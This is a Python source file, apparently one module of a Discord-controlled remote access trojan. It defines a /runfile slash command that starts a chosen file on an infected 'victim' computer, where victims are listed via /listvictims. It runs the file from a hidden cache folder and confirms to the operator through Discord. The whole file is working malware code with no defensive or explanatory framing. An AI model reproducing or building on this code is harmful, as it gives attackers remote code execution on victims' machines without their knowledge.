import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, subprocess
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class RunFile(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command( )
    async def runfile(self, ctx, victim, file_path):     
        """Execute a file in victim's PC
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        file_path: Path of the file for executing.
        """
        
        if str(victim) == str(self.bot.identifier):
        
            if os.path.isfile(file_path):
            
                output = subprocess.Popen(
                    file_path, 
                    cwd = nr_working
                )
                
                return await ctx.response.send_message(
                    embed = self.bot.genEmbed(
                        "File has been started!",
                        datetime.now(),
                        "You gotta trust me on that one"
                    )
                )
                
            else:
            
                return await ctx.response.send_message(
                    embed = self.bot.genEmbed(
                        "Invalid file",
                        datetime.now()
                    )
                )

def setup(bot: commands.Bot):
    bot.add_cog(RunFile(bot))